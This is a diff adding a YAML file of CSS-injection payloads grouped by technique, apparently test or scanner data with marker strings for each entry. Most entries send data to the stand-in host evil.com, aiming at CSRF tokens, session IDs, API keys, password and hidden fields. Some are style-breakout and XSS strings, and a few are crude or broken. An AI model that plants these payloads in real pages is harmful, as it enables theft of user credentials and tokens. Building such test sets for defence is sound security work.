@@ -1,0 +1,249 @@
+category_map:
+  injection_points:
+    - style_tag_inject
+    - style_attr_inject
+    - link_href_inject
+    - import_url_inject
+    - comment_css_inject
+    - meta_refresh_css
+  data_extraction:
+    - background_url
+    - content_url
+    - list_style_url
+    - cursor_url
+    - border_image_url
+    - mask_image_url
+    - font_face_url
+  attribute_leak:
+    - attr_src_leak
+    - attr_href_leak
+    - attr_action_leak
+    - attr_value_leak
+    - attr_type_leak
+    - attr_data_leak
+  selector_abuse:
+    - nth_child_selector
+    - has_selector
+    - is_selector
+    - where_selector
+    - not_selector
+    - has_is_chain
+  token_exfil:
+    - csrf_token_leak
+    - auth_token_leak
+    - session_id_leak
+    - api_key_leak
+    - bearer_token_leak
+    - hidden_field_leak
+  csp_bypass:
+    - import_unicode_bypass
+    - js_context_css
+    - data_uri_css
+    - expression_legacy
+    - import_charset_bypass
+    - link_import_xss
+    - css_import_js
+
+injection_payloads:
+  - - style_tag_inject
+    - '</style><style>body{background:red}</style>'
+    - style_tag
+    - - '</style>'
+      - background
+  - - style_attr_inject
+    - '" style="background:url(http://evil.com/)'
+    - style_attr
+    - - style=
+      - background
+  - - link_href_inject
+    - '<link rel=stylesheet href=http://evil.com/style.css>'
+    - link_css
+    - - link
+      - stylesheet
+  - - import_url_inject
+    - '@import url(http://evil.com/style.css);'
+    - import_css
+    - - '@import'
+      - url
+  - - comment_css_inject
+    - '<!--</style><style>body{background:red}</style>-->'
+    - comment_css
+    - - '</style>'
+      - background
+  - - meta_refresh_css
+    - '<meta http-equiv=refresh content=0;url=data:text/css,body{background:red}>'
+    - meta_css
+    - - meta
+      - refresh
+
+data_extraction_payloads:
+  - - background_url
+    - 'body{background:url(http://evil.com/?data=exfil)}'
+    - background_url
+    - - background
+      - url
+  - - content_url
+    - 'body::after{content:url(http://evil.com/?data=exfil)}'
+    - content_url
+    - - content
+      - url
+  - - list_style_url
+    - 'ul{list-style-image:url(http://evil.com/?data=exfil)}'
+    - list_style
+    - - list-style
+      - url
+  - - cursor_url
+    - 'body{cursor:url(http://evil.com/?data=exfil),auto}'
+    - cursor_url
+    - - cursor
+      - url
+  - - border_image_url
+    - 'body{border-image:url(http://evil.com/?data=exfil) 1}'
+    - border_image
+    - - border-image
+      - url
+  - - mask_image_url
+    - 'body{-webkit-mask-image:url(http://evil.com/?data=exfil)}'
+    - mask_image
+    - - mask-image
+      - url
+  - - font_face_url
+    - '@font-face{font-family:x;src:url(http://evil.com/?data=exfil)}'
+    - font_face
+    - - '@font-face'
+      - url
+
+attribute_leak_payloads:
+  - - attr_src_leak
+    - 'img[src]{background:url(http://evil.com/?src=attr)}'
+    - attr_src
+    - - '[src]'
+      - background
+  - - attr_href_leak
+    - 'a[href]{background:url(http://evil.com/?href=attr)}'
+    - attr_href
+    - - '[href]'
+      - background
+  - - attr_action_leak
+    - 'form[action]{background:url(http://evil.com/?action=attr)}'
+    - attr_action
+    - - '[action]'
+      - background
+  - - attr_value_leak
+    - 'input[value]{background:url(http://evil.com/?value=attr)}'
+    - attr_value
+    - - '[value]'
+      - background
+  - - attr_type_leak
+    - 'input[type]{background:url(http://evil.com/?type=attr)}'
+    - attr_type
+    - - '[type]'
+      - background
+  - - attr_data_leak
+    - '[data-secret]{background:url(http://evil.com/?secret=attr)}'
+    - attr_data
+    - - '[data-secret]'
+      - background
+
+selector_abuse_payloads:
+  - - nth_child_selector
+    - 'input:nth-child(1){background:url(http://evil.com/?nth=exfil)}'
+    - nth_child
+    - - ':nth-child'
+      - background
+  - - has_selector
+    - 'div:has(input[type=password]){background:url(http://evil.com/?has=exfil)}'
+    - has_selector
+    - - ':has('
+      - background
+  - - is_selector
+    - 'input:is([type=text],[type=password]){background:url(http://evil.com/?is=exfil)}'
+    - is_selector
+    - - ':is('
+      - background
+  - - where_selector
+    - 'input:where([name*=token]){background:url(http://evil.com/?where=exfil)}'
+    - where_selector
+    - - ':where('
+      - background
+  - - not_selector
+    - 'input:not([type=hidden]){background:url(http://evil.com/?not=exfil)}'
+    - not_selector
+    - - ':not('
+      - background
+  - - has_is_chain
+    - 'div:has(input:is([name*=csrf])){background:url(http://evil.com/?chain=exfil)}'
+    - has_is_chain
+    - - ':has('
+      - ':is('
+      - background
+
+token_exfil_payloads:
+  - - csrf_token_leak
+    - 'input[name*=csrf]{background:url(http://evil.com/?csrf=exfil)}'
+    - csrf_token
+    - - '[name*=csrf]'
+      - background
+  - - auth_token_leak
+    - 'input[name*=token]{background:url(http://evil.com/?token=exfil)}'
+    - auth_token
+    - - '[name*=token]'
+      - background
+  - - session_id_leak
+    - 'input[name*=session]{background:url(http://evil.com/?sid=exfil)}'
+    - session_id
+    - - '[name*=session]'
+      - background
+  - - api_key_leak
+    - 'input[name*=api_key]{background:url(http://evil.com/?apikey=exfil)}'
+    - api_key
+    - - '[name*=api_key]'
+      - background
+  - - bearer_token_leak
+    - 'input[name*=bearer]{background:url(http://evil.com/?bearer=exfil)}'
+    - bearer_token
+    - - '[name*=bearer]'
+      - background
+  - - hidden_field_leak
+    - 'input[type=hidden]{background:url(http://evil.com/?hidden=exfil)}'
+    - hidden_field
+    - - '[type=hidden]'
+      - background
+
+csp_bypass_payloads:
+  - - import_unicode_bypass
+    - '@import url(http://evil.com/\00style.css);'
+    - import_unicode
+    - - '@import'
+      - url
+  - - js_context_css
+    - 'javascript:body{background:url(http://evil.com/?js=exfil)}'
+    - js_context
+    - - javascript:
+      - background
+  - - data_uri_css
+    - 'body{background:url(data:text/css,body{background:url(http://evil.com/)}'
+    - data_uri
+    - - data:
+      - url
+  - - expression_legacy
+    - 'body:expr/**/ession(alert(1))'
+    - expression
+    - - expression
+  - - import_charset_bypass
+    - '@import url(http://evil.com/style.css) screen;'
+    - import_media
+    - - '@import'
+      - url
+  - - link_import_xss
+    - '<link rel=import href="data:text/html,<script>alert(1)</script>">'
+    - link_import
+    - - link
+      - import
+      - script
+  - - css_import_js
+    - '@import "data:text/css,body{background:url(javascript:alert(1))}";'
+    - css_import_js
+    - - '@import'
+      - data:
+      - javascript:
